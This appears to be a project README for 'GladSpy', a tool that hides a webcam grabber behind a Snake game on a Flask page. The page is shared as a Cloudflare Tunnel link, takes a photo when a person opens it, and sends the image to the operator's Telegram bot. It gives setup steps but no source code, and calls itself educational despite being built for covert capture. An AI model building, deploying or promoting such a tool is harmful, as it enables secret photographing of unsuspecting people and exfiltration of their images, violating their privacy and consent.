# GladSpy 🔍📸

GladSpy is a browser-based stealth camera capture tool I built, which uses the HTML5 camera API and Flask backend to capture an image when a user opens a link. It is publicly accessible via Cloudflare Tunnel and instantly sends the captured image to a Telegram bot. Additionally, it includes a classic Snake game to add a layer of engagement, without interfering with the camera functionality.

> ⚠️ This project is created for **educational purposes only**. Please use responsibly.

---

## 🚀 Features

- 📸 Automatically triggers the user's webcam on page load (with permission).
- 📤 Captures and sends images instantly to a specified Telegram chat.
- 🌐 Public access using Cloudflare Tunnel – easy to share links.
- 🎮 Lightweight built-in Snake game playable via keyboard or on-screen controls.
- ⚙️ Optimized for both desktop and mobile browsers.
- 📂 Captures are saved locally in the `captured/` folder before being sent.

---

## 🛠️ Tech Stack

- **Frontend**: HTML5, JavaScript (Canvas API)
- **Backend**: Flask (Python)
- **Tunnel**: Cloudflare Tunnel
- **Bot**: Telegram Bot API

---

## 📦 Installation

1. **Clone the repo**
   ```bash
   git clone https://github.com/your-username/gladspy.git
   cd gladspy

2.Edit app.py and replace:

TELEGRAM_BOT_TOKEN = 'your_bot_token'
TELEGRAM_CHAT_ID = 'your_chat_id'

3.Run the app

python app.py

4.Make it public

./tunnel.sh
